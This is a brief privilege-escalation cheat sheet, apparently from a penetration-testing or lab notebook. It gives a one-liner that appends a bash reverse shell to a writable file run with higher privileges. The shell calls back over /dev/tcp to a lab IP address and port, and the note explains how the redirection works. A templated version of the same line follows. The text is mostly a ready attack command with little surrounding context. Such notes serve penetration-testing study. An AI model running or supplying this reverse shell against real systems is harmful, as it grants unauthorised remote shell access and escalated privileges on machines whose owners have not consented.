# Privilege escalation

privilege escalation is vast topic in itself, however technique can be simple as:

1. Any other user in the box?
2. Any file with higher permission

`echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.159/1234 0>&1'  #" >> badlypermissionedfile`

Explanation: `bash -i >& /dev/tcp/<IP>/<port> 0>&1`

This snippet runs a new interactive instance of bash \(bash -i\), on a TCP connection to the specified port on the specified host which is created for the duration of the bash process. Standard output and standard error are sent through this connection \(`>& /dev/tcp/HOST/PORT`\), and standard input is read through this connection \(`0>&1` or `0<&1` both works\).

`echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/<IP_ADDRESS>/<1234> 0>&1'  #" >> filename`

